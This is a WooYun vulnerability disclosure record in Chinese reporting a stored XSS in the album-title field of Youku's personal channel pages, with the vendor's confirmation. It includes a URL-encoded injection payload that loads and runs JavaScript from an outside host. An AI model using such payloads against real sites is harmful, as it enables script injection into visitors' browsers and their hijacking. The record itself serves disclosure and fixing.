{"id": 1618, "wybug_id": "wooyun-2014-069124", "wybug_title": "优酷主站stored xss可执行任意js代码", "wybug_corp": "优酷", "wybug_author": "爱上电饭锅", "wybug_date": "2014-07-20 19:43", "wybug_open_date": "2014-09-03 19:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "利用技巧", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向公众公开  简要描述： 优酷个人频道（XXX的频道）存在存储型XSS，可加载并允许执行任意外部js代码。如为网络红人，可绑架DDoS僵尸。 详细说明：  说来是个毫无水准的洞，但是危害性不小。漏洞存在于XXX的频道页面，专辑标题编辑处只做了前端JS过滤，直接发request可以随便提交任意HTML代码。如下图，页面回显做了encode，可是title没有做。导致可以注入HTML。\n\n测试后发现可以随便插入<script src>引用外站js，并可以顺利执行。于是写了一个有营养的利用代码，把原来的DIV隐藏掉，显示自己的DIV，并执行我的remote js文件打印一段话在页面上，顺便弹框。利用代码如下：%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fweichch.apphb.com%2Fxss.js%22%3E%3C%2Fscript%3EMalware%20Tag%3Cspan%20class%3D%22append%22%3E%3Ca%20href%3D%22%2Fu%2FUMTYzMjk4NDk5Mg%3D%3D%2Fvideos%22%3E(0)%3C%2Fa%3E%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20style%3D%22display%3Anone%22%3E访问个人频道即可触发，效果见漏洞证明部分。   漏洞证明：  \n\n   修复方案：  只好加班啦   版权声明：转载请注明来源 爱上电饭锅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-07-21 07:50 厂商回复： 多谢提醒，马上修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-21 04:12 |    \t\t90sid \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | (*^__^*))\t\t \n  前排板凳    \n     2014-09-04 08:18 |    \t\t树上草 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:8        | <img height=\"12\" width=\"12\" style=\"verti...)\t\t \n  沙发。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}